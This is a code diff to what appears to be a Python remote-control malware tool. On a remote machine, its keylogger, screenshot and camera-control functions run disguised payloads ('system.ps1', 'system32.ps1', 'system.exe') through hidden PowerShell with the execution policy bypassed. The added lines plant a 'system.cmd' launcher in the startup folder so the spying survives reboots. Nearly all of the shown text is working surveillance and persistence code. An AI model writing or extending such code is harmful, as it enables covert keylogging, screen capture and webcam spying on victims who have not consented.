@@ -78,7 +78,13 @@ def payloads(address, username, password, temp, startup):
 
 def run_control_keylogger(address, username, password, temp, startup):
     print("[*] Starting run control keylogger ...")
+
     run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.ps1"
+
+    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.ps1' && echo 'del system.cmd' > system.cmd"
+    run_command(address, username, password, control)
+    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
+
     run_command(address, username, password, run_control)
     print("[+] Keylogger running ...")
 
@@ -88,7 +94,12 @@ def take_file_log(address,name ,username, password, path):
     
 def screenshot(address, username, password, temp, startup):
     print("[*] Starting run control screenshot ...")
+
     run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system32.ps1"
+
+    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system32.ps1' && echo 'del system.cmd'> system.cmd"
+    run_command(address, username, password, control)
+    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
     run_command(address, username, password, run_control)
     print("[+] Screenshot running ...")
     
@@ -98,6 +109,9 @@ def take_screenshot(address, username, password, path):
 def control_camera(address, username, password, temp, startup):
     print("[*] Starting control camera ...")
     run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.exe"
+    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.exe' && echo 'del system.cmd' > system.cmd"
+    run_command(address, username, password, control)
+    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
     run_command(address, username, password, run_control)
     print("[+] Started camera . . .")
 
